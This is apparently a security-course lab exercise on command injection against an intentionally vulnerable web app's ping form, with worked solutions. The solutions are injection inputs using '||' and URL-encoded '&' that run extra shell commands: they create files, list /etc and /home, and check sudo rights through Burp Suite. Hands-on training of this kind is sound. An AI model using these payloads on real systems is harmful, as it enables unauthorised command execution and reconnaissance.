# Loud Pipes

In this exercise, you'll use `||` and `&` to bypass a simple user-input filter.

---

## Instructions
- Click **Command Injection** in the left navigation bar, and make sure your security level is set to **medium**.

- Use the `||` to:
  - Check the installed version of Perl
  - List running network services (`netstat`)
  - Create a file, then check if it was created
  > **Solution**
  > ```bash
  > # Check the installed version of Perl
  > bad_ip || perl --version
  > # List running network services (`netstat`)
  > bad_ip || netstat -ta
  > # Create a file, then check if it was created
  > bad_ip || touch experiment
  > bad_ip || ls
  > ```
  > Note that the file creation experiment worked—this is dangerous!

- Launch Burp Suite. Send an IP address through the form; intercept the request; and send it to Repeater.

- Use Repeater and the `&` operator to:
  - List the contents of `/etc`
  - List the contents of `/home`
  - Print the commands you can run with `sudo` (`sudo -L`)
  - Remember that you must encode spaces and plus signs in the URLs! You can use Google or the **Burp Decoder** tab for this.
  > **Solutions**: The correct POST bodies are below. Note that the `&` is encoded as `%26`.
  > ```bash
  > # List the contents of `/etc`
  > ip=8.8.8.8%20%26%20ls%20/etc&Submit=submit
  > # List the contents of `/home`
  > ip=8.8.8.8%20%26%20ls%20/home&Submit=submit
  > # Print the commands you can run with `sudo` (`sudo -L`)
  > ip=8.8.8.8%20%26sudo%20-L&Submit=submit
  > ```

- Repeat the above exercise with Intruder, but redirect ping's output to `/dev/null`. 
  - How do the responses differ? 
  > **Solution**: The responses differ in that they omit the output from ping, and only include the output of the command we chose to run. The commands that list the contents of `/home` and output of `sudo -L` return no output, indicating that the `www-data` user (which is the user whose permission the command runs with) has no `sudo` rights, and cannot view the contents of `/home`. `www-data` can, however, list the contents of `/etc`, so we must use these results to further exploit the machine.
